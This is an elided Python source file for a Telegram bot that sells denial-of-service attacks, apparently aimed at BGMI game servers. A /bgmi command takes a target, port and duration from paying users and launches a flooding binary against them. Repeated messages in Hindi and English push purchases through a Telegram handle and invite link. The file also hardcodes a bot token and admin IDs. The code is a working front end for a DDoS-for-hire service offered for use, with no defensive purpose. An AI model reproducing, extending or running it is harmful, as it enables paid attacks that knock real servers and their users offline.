...
bot = telebot.TeleBot('8133461057:AAEs1dUDkFmS5_c2Sd9VWA0DX6-68mIKIyg')

# Admin user IDs
admin_id = {"7459656293", "1174779637"}
...
#  Join Official Channel @DDOS_VVIP
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "Mood ni hai abhi pelhe purchase kar isse:- @DDOS_VVIP."
...
 Usage: /remove <userid>'''
        ...
        response = "BHAI BUY KRLE:- @DDOS_VVIP ."
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, port, and time
            ...
            if time > 241:
                response = "Error: Buy From @DDOS_VVIP For More Time"
            else:
                ...
                try:
                    ...
                    full_command = f"./fuck {target} {port} {time}"
        ...
        response = "BHAI BUY KRLE BAHUT SASTA HAI,@DDOS_VVIP"
...
Buy From :- @DDOS_VVIP
Official Channel :- https://t.me/+Dez-hNv5PIA5NWU1
'''
...
3. MAKE SURE YOU JOINED https://t.me/+Dez-hNv5PIA5NWU1 OTHERWISE NOT WORK
